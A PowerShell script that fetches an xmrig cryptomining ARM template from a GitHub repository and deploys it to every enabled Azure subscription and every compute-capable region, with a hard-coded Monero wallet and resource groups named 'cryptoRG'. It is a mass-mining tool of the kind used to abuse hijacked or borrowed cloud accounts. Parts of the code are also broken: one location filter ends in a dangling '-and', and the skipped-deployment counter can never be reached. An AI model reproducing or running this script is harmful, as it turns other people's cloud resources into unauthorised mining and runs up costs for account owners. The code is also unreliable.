<#
.SYNOPSIS
    Deploys an ARM template to all Azure subscriptions and locations
    
.DESCRIPTION
    This script deploys a specified ARM template across all accessible Azure subscriptions
    and all available locations within each subscription. Creates resource groups as needed.
    
.PARAMETER TemplateUrl
    URL of the ARM template to deploy
    
.PARAMETER Wallet
    Wallet address parameter for the template
    
.PARAMETER ResourceGroupName
    Base name for resource groups (default: "cryptoRG")
    
.PARAMETER SkipExisting
    Skip deployments if resource group already exists
    
.NOTES
    Requires Azure PowerShell module and Contributor permissions on subscriptions
    Template URL: https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json
#>

param(
    [string]$TemplateUrl = "https://raw.githubusercontent.com/myhomemail565-gif/cryptocloud/master/xmrig/azure/arm/template.json",
    [string]$Wallet = "85fHndEnn5geDRAuWvnrvTR8PE8KmztiQev95rDoQqvyAdibnfSGQX2Ww4V4XadbX6VxbZ1Q2uWYcUWjhqxseojY4o2GTeb",
    [string]$ResourceGroupName = "cryptoRG",
    [switch]$SkipExisting = $false
)

# Clear any existing Azure context
#Clear-AzContext -Force -ErrorAction SilentlyContinue

# Function to deploy template in a location
function Deploy-TemplateToLocation {
    param(
        [string]$SubscriptionName,
        [string]$SubscriptionId,
        [string]$Location,
        [string]$WalletAddress,
        [string]$BaseRGName
    )
    
    # Create unique resource group name per subscription and location
    $rgName = "$BaseRGName-$($Location.Replace(' ', '').ToLower())"
    $deploymentName = "deploy-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
    
    Write-Host "`n[SUBSCRIPTION: $SubscriptionName]" -ForegroundColor Magenta
    Write-Host "  Location: $Location" -ForegroundColor Cyan
    Write-Host "  Resource Group: $rgName" -ForegroundColor Cyan
    Write-Host "  Deployment: $deploymentName" -ForegroundColor Cyan
    
    try {
        # Check if resource group exists
        $existingRG = Get-AzResourceGroup -Name $rgName -Location $Location -ErrorAction SilentlyContinue
        
        if ($existingRG -and $SkipExisting) {
            Write-Host "  SKIPPED: Resource group already exists (use -SkipExisting:$false to override)" -ForegroundColor Yellow
            return $false
        }
        
        # Create or update resource group
        if (-not $existingRG) {
            Write-Host "  Creating resource group..." -ForegroundColor Gray
            New-AzResourceGroup -Name $rgName -Location $Location -Force | Out-Null
        } else {
            Write-Host "  Using existing resource group..." -ForegroundColor Gray
        }
        
        # Deploy the ARM template
        Write-Host "  Deploying template..." -ForegroundColor Gray
        
        $deploymentParams = @{
            ResourceGroupName = $rgName
            TemplateUri = $TemplateUrl
            Name = $deploymentName
            User_wallet = $WalletAddress
            location = $Location
            Force = $true
            ErrorAction = 'Stop'
        }
        
        $deployment = New-AzResourceGroupDeployment @deploymentParams
        
        Write-Host "  SUCCESS: Deployment completed in $($deployment.ProvisioningState) state" -ForegroundColor Green
        
        # Output useful information if available
        if ($deployment.Outputs.Count -gt 0) {
            Write-Host "  Deployment outputs:" -ForegroundColor DarkGray
            $deployment.Outputs | ForEach-Object {
                Write-Host "    $($_.Key): $($_.Value.Value)" -ForegroundColor DarkGray
            }
        }
        
        return $true
    }
    catch {
        Write-Host "  FAILED: $($_.Exception.Message)" -ForegroundColor Red
        
        # Provide more specific error details
        if ($_.Exception -like "*quota*") {
            Write-Host "    HINT: Check subscription quotas in $Location" -ForegroundColor Yellow
        }
        elseif ($_.Exception -like "*not authorized*") {
            Write-Host "    HINT: Ensure you have Contributor role on subscription" -ForegroundColor Yellow
        }
        elseif ($_.Exception -like "*not available*") {
            Write-Host "    HINT: Some resources may not be available in $Location" -ForegroundColor Yellow
        }
        
        return $false
    }
}

# Main execution
Write-Host "=== ARM Template Multi-Subscription Deployment ===" -ForegroundColor Yellow
Write-Host "Template: $TemplateUrl" -ForegroundColor Yellow
Write-Host "Wallet: $Wallet" -ForegroundColor Yellow
Write-Host "Resource Group Pattern: $ResourceGroupName-{location}" -ForegroundColor Yellow
Write-Host ""

#@

# Step 2: Get all accessible subscriptions
Write-Host "`nStep 2: Retrieving subscriptions..." -ForegroundColor Green
try {
    $allSubscriptions = Get-AzSubscription -ErrorAction Stop | Where-Object { $_.State -eq 'Enabled' }
    
    if ($allSubscriptions.Count -eq 0) {
        Write-Host "  No enabled subscriptions found!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host "  Found $($allSubscriptions.Count) enabled subscription(s)" -ForegroundColor Green
    
    # Display subscription list
    $subscriptionList = $allSubscriptions | Select-Object @{Name='Name';Expression={$_.Name}}, 
                                                         @{Name='Id';Expression={$_.Id}},
                                                         @{Name='TenantId';Expression={$_.TenantId}}
    $subscriptionList | Format-Table -AutoSize | Out-Host
}
catch {
    Write-Host "  Failed to retrieve subscriptions: $_" -ForegroundColor Red
    exit 1
}

# Step 3: Confirm before proceeding
Write-Host "`nWARNING: This will deploy resources to ALL $($allSubscriptions.Count) subscription(s)" -ForegroundColor Red
Write-Host "across ALL available locations in each subscription." -ForegroundColor Red

$confirmMessage = @"
This will:
1. Create resource groups in multiple locations
2. Deploy ARM templates with wallet: $Wallet
3. Potentially incur Azure costs

Type 'YES' to continue: 
"@

$confirmation = Read-Host $confirmMessage
if ($confirmation -ne "YES") {
    Write-Host "Deployment cancelled." -ForegroundColor Yellow
    exit 0
}

# Counters for reporting
$totalDeployments = 0
$successfulDeployments = 0
$skippedDeployments = 0
$failedDeployments = 0

# Step 4: Process each subscription
foreach ($subscription in $allSubscriptions) {
    Write-Host "`n" + ("=" * 60) -ForegroundColor DarkGray
    Write-Host "PROCESSING SUBSCRIPTION: $($subscription.Name)" -ForegroundColor White -BackgroundColor DarkBlue
    
    try {
        # Set subscription context
        Set-AzContext -Subscription $subscription.Id -ErrorAction Stop | Out-Null
        
        # Get available locations for this subscription
        $locations = Get-AzLocation | Where-Object {
            $_.Providers -contains "Microsoft.Compute" -and  # Ensure Compute is available
            
        } | Select-Object -ExpandProperty Location -Unique
        
        Write-Host "  Available locations: $($locations.Count)" -ForegroundColor Cyan
        
        # Process each location
        foreach ($location in $locations) {
            $totalDeployments++
            
            $result = Deploy-TemplateToLocation -SubscriptionName $subscription.Name `
                                               -SubscriptionId $subscription.Id `
                                               -Location $location `
                                               -WalletAddress $Wallet `
                                               -BaseRGName $ResourceGroupName
            
            if ($result -eq $true) {
                $successfulDeployments++
            } elseif ($result -eq $false) {
                $failedDeployments++
            } else {
                $skippedDeployments++
            }
            
            # Small delay to avoid throttling
            Start-Sleep -Milliseconds 500
        }
    }
    catch {
        Write-Host "  ERROR processing subscription: $_" -ForegroundColor Red
        $failedDeployments += $locations.Count
        continue
    }
}

# Final summary
Write-Host "`n" + ("=" * 60) -ForegroundColor DarkGray
Write-Host "=== DEPLOYMENT SUMMARY ===" -ForegroundColor Yellow
Write-Host "Total subscriptions processed: $($allSubscriptions.Count)" -ForegroundColor Cyan
Write-Host "Total deployment attempts: $totalDeployments" -ForegroundColor Cyan
Write-Host "Successful deployments: $successfulDeployments" -ForegroundColor Green
Write-Host "Failed deployments: $failedDeployments" -ForegroundColor Red
Write-Host "Skipped deployments: $skippedDeployments" -ForegroundColor Yellow
Write-Host "`nScript completed!" -ForegroundColor Yellow

# Optional: Save deployment log
$logEntry = @"
$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Template: $TemplateUrl
Wallet: $Wallet
Subscriptions: $($allSubscriptions.Count)
Attempted: $totalDeployments
Successful: $successfulDeployments
Failed: $failedDeployments
Skipped: $skippedDeployments
"@

$logEntry | Out-File -FilePath ".\DeploymentLog_$(Get-Date -Format 'yyyyMMdd').txt" -Append
Write-Host "Log saved to: .\DeploymentLog_$(Get-Date -Format 'yyyyMMdd').txt" -ForegroundColor Gray
